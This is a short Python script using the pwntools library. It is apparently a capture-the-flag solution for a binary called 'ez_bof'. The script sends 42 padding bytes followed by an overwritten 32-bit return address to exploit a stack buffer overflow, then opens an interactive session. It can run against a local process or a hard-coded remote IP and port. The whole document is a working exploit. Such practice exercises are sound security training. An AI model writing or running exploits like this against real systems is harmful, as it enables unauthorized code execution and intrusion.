#!/usr/bin/env python
from pwn import *
import sys

HOST = '45.77.42.87'
PORT = 80

def info(s):
	log.info(s)

def exploit(p):

	payload='a'*42+p32(0x0804865B)
	p.sendline(payload)
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('/home/khongtrang/share/infosec/ez_bof')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)